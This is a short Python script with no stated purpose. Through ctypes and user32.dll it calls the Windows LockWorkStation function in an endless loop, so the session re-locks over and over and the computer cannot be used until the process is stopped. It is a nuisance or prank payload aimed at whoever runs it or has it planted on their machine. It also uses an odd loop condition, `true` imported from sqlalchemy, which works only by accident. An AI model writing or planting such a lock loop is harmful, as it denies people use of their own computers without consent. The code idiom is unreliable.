from ctypes import *

from sqlalchemy import true

while true:
    user32 = windll.LoadLibrary('user32.dll')

    user32.LockWorkStation()